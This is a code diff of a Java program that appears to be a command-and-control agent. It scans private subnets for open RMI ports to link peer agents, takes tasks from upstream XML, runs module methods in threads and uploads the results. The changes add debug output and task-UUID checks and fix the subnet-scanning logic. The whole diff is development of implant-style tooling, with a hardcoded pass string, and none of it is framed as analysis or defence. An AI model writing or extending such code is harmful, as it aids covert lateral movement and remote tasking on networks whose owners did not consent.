@@ -20,6 +20,8 @@ import java.util.UUID;
 import java.util.concurrent.TimeUnit;
 import java.util.stream.Collectors;
 import java.util.Base64;
+import java.util.Arrays;
+
 import org.w3c.dom.Document;
 import org.w3c.dom.Element;
 import org.w3c.dom.Node;
@@ -33,6 +35,7 @@ import javax.xml.parsers.ParserConfigurationException;
 import javax.xml.transform.dom.DOMSource;
 import javax.xml.transform.*;
 import javax.xml.transform.stream.StreamResult;
+
 import java.net.UnknownHostException;
 import java.nio.charset.StandardCharsets;
 import java.rmi.Naming;
@@ -74,6 +77,7 @@ import java.security.cert.X509Certificate;
 import java.security.spec.AlgorithmParameterSpec;
 import java.text.SimpleDateFormat;
 import java.security.InvalidKeyException;
+import java.util.List;
 
 
 class nConfig
@@ -85,7 +89,7 @@ class nConfig
     public static String server = "127.0.0.1";
     public static int isDownstream = 0;
     public static String upstreamSvc = "0000NocRemRegImplEx";
-    public static String upstreamHost = "";
+    public static String upstreamHost = "null";
     public static int upstreamPort = 35506;
     public static int virtThreshold = 10; //6 for when it's ready
     public static String passMat = "T__+Pmv.REW=u9iXBB-";
@@ -135,6 +139,8 @@ public class Main
         //TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(19,37))*1000);
         p2pList = nComm.findP2P();
 
+        System.out.println(p2pList.toString());
+
         if (p2pList.size() > 0)
         {
             config.isDownstream = 1;
@@ -170,16 +176,17 @@ public class Main
 
             try
             {  
-                if (config.isDownstream == 1 && c<p2pList.size()-1)
+                if (config.isDownstream == 1)
                 {
                     //we have a problem. Theoretically this network configuration will eventually eat itself
             
                     //every agent wants to talk to other agents, and will attempt to do so if possible
 
-                    //
-
                     //add logic on tasking to allow for multiple upstreams
-                    config.upstreamHost = (String) p2pList.get(c);
+                    if (config.upstreamHost.equals("null"))
+                    {
+                        config.upstreamHost = (String) p2pList.get(c);
+                    }
 
                     ArrayList ifaceP2PRaw = nComm.initP2PInterface();
 
@@ -235,6 +242,7 @@ public class Main
                         {
                             tasks.add(taskSet.get(k));
                         }
+                        System.out.println(xmlResponse.toString());
                         break;
                     }
                     else
@@ -251,7 +259,9 @@ public class Main
                 continue;
             }
         }
+
         if (c<4) {
+            System.out.println("react");
             react();
         }
         else
@@ -275,8 +285,10 @@ public class Main
             Hashtable taskObj = (Hashtable) tasks.get(t);
             tasks.remove(t);
 
-            if (!taskObj.keySet().contains(sessUUID))
+            if (!taskObj.get("uuid").toString().equals(sessUUID))
             {
+                System.out.println("nope, not my problem");
+                System.out.println(sessUUID);
                 continue;
             }
 
@@ -304,7 +316,6 @@ public class Main
             }
 
             Hashtable methObj = nUtil.getMethodByName(classObj, methodName);
-            
 
             if (methObj.get("error").toString() != "null")
             {
@@ -318,6 +329,7 @@ public class Main
             }
             else
             {
+                System.out.println("threading");
                 threader(
                     classObj,
                     (Method) methObj.get("methodical"),
@@ -355,6 +367,7 @@ public class Main
                     {
                         String cReq = nComm.request(nUtil.xmlDocToString(outData),"upload");
                     }
+                    output.remove(d);
                 }
                 catch (Exception e)
                 {
@@ -495,6 +508,7 @@ public class Main
                     taskDescriptor.put("method",nodeElement.getAttribute("method"));
                     taskDescriptor.put("args",nodeElement.getAttribute("args"));
                     taskDescriptor.put("mod",nodeElement.getTextContent());
+                    taskDescriptor.put("uuid",nodeElement.getAttribute("uuid"));
 
                     taskSet.add(taskDescriptor);
                     xmlData.put("tasks",taskSet);
@@ -790,7 +804,7 @@ public class Main
                 try (Socket socket = new Socket()) 
                 {
                     String host = (String) addresses.get(h);
-                    socket.connect(new InetSocketAddress(host, config.upstreamPort), 1000);
+                    socket.connect(new InetSocketAddress(host, config.upstreamPort), 500);
                     localNodes.add(host);
                     socket.close();
                 } 
@@ -807,7 +821,7 @@ public class Main
             ArrayList subnetAddrs = new ArrayList();
             for (int a=0;a<ipAddresses.size();a++)
             {
-                String[] prefix = ((String) ipAddresses.get(a)).split(".");
+                String[] prefix = ((String) ipAddresses.get(a)).split("\\.");
                 for (int o=1; o<255; o++)
                 {
                     if (o != Integer.valueOf(prefix[3]))
@@ -830,14 +844,14 @@ public class Main
             while (i.hasMoreElements())
             {
                 String ifaceKey = i.nextElement();
-                ArrayList ifaceData = (ArrayList) ifaces.get(ifaceKey);
 
-                if (ifaceData.contains("192.168.") || ifaceData.contains("10.") || ifaceData.contains("172.16."))
+                String ifaceDataRaw = ifaces.get(ifaceKey).toString();
+                if (ifaceDataRaw.contains("192.168.") || ifaceDataRaw.contains("10.") || ifaceDataRaw.contains("172.16."))
                 {
-                    ipAddresses.add(ifaceData.get(1));
+                    ArrayList ifaceData = new ArrayList(Arrays.asList(ifaceDataRaw.replace("[","").replace("]","").split(",")));
+                    ipAddresses.add(ifaceData.get(1).toString().replace(" ",""));
                 }
             }
-
             ArrayList netAddresses = calcSubnetAddrs(ipAddresses);
             return findOpenRMI(netAddresses);
         }
